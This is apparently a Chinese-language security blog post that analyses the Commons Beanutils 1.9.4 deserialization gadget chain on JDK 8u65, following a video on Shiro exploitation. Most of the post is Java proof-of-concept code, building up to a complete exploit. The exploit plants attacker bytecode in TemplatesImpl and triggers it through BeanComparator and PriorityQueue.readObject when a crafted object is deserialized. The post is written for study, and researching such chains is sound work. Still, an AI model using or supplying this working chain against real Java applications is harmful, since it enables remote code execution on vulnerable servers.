# 分析版本

Commons Beanutils 1.9.4

JDK 8u65

参考[Shiro反序列化漏洞(三)-shiro无依赖利用链]([Shiro反序列化漏洞(三)-shiro无依赖利用链_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1uf4y1T7Rq/?spm_id_from=333.788&vd_source=686636e30f91f8a12e28751943870859))

# 分析过程

Commons Beanutils是一个用于操作JAVA BEAN的工具包。

先看下基础使用

```java
public class Person { //JAVA BEAN

    private String name;
    private int age;

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }
}
```

```java
import org.apache.commons.beanutils.PropertyUtils;

public class BeanTest {
    public static void main(String[] args) throws Exception {
        Person person = new Person("666",24);
        //System.out.println(person.getName());
        System.out.println(PropertyUtils.getProperty(person,"name"));  //和getName作用相同
    }
}
```

可以打个断点，自己跟一下

下面这是反射调用Person的getName（驼峰命名，由name属性找到了getName方法）

![image-20240710102201647](https://s2.loli.net/2024/07/10/Bngl6MXsWczk7Ib.png)

可以想到，invokeMethod能不能利用。

作者在这里找到的是TemplatesImpl的getOutputProperties方法。

```java
public synchronized Properties getOutputProperties() {
    try {
        return newTransformer().getOutputProperties(); //CC3中动态加载类是由newTransformer调用的
    }
    catch (TransformerConfigurationException e) {
        return null;
    }
}
```

而getOutputProperties方法名，是遵循驼峰命名的。可以通过PropertyUtils.getProperty(TemplatesImpl,"outputProperties")查找到。

我们可以执行下，看看是否可以动态加载类。

Poc

```java
    public static void main(String[] args) throws Exception{
        byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Test.class"));
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "pass");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());

        PropertyUtils.getProperty(templates,"outputProperties");

//        serialize(object);
//        unserialize("s.ser");
    }
```

弹出计算器

接下来再找PropertyUtils.getProperty的调用，最后还是要找到readObject

作者找到的是BeanComparator的compare方法。

![image-20240710111005756](https://s2.loli.net/2024/07/10/J24ALzayb5s7pXd.png)

```java
public int compare( final T o1, final T o2 ) {

    if ( property == null ) {
        // compare the actual objects
        return internalCompare( o1, o2 );
    }

    try {
        final Object value1 = PropertyUtils.getProperty( o1, property ); //两个参数都可控制  templates,"outputProperties"
        final Object value2 = PropertyUtils.getProperty( o2, property );
        return internalCompare( value1, value2 );
    }
    catch ( final IllegalAccessException iae ) {
        throw new RuntimeException( "IllegalAccessException: " + iae.toString() );
    }
    catch ( final InvocationTargetException ite ) {
        throw new RuntimeException( "InvocationTargetException: " + ite.toString() );
    }
    catch ( final NoSuchMethodException nsme ) {
        throw new RuntimeException( "NoSuchMethodException: " + nsme.toString() );
    }
}
```

我们再联系CC2链的寻找，也是需要找一个入口链触发TransformingComparator的compare方法。

CC2中找到的是优先队列PriorityQueue的readObject方法。

更新Poc

```java
public class CB {
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("s.ser"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception{
        //CC2
        byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Test.class"));
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "pass");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());

        BeanComparator<Object> beanComparator = new BeanComparator<>("outputProperties");
        PriorityQueue priorityQueue = new PriorityQueue<>(); //构造的时候，如果把beanComparator放入，add(1)方法会调用代码执行在Integer中查找属性outputProperties的方法，查不到会报错，抛出异常

        priorityQueue.add(templates);
        priorityQueue.add(1);

        Field comparator = priorityQueue.getClass().getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue, beanComparator);

        serialize(priorityQueue);
        unserialize("s.ser");
    }
}
```

这样的话在priorityQueue.add(1);处会报错，跟进去看发现

add方法调用到siftDown方法

```java
private void siftDown(int k, E x) {
    if (comparator != null)        //如果实例化优先队列定义了comparator，则进入siftDownUsingComparator(k, x);
        siftDownUsingComparator(k, x);
    else
        siftDownComparable(k, x);   //现在的Poc 没有定义comparator，进入siftDownUsingComparator(k, x);会抛出异常
}
```

所以我们在实例化优先队列时把comparator定义了，就能解决问题了。

**这里是利用的CC库的TransformingComparator，因为在反序列化之前，我们又通过反射把comparator改为了beanComparator，所以CC库的类并不参与序列化。**

最终Poc

```java
public class CB {
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("s.ser"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception{
        //CC3
        byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Test.class"));
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "pass");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());
        //CB
        BeanComparator<Object> beanComparator = new BeanComparator<>("outputProperties");
        //CC2
        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator); //构造的时候，如果把beanComparator放入，add(1)方法会调用代码执行在Integer中查找属性outputProperties的方法，查不到会报错，抛出异常

        priorityQueue.add(templates);
        priorityQueue.add(1);

        Field comparator = priorityQueue.getClass().getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue, beanComparator);

        //serialize(priorityQueue);
        unserialize("s.ser");
    }
}
```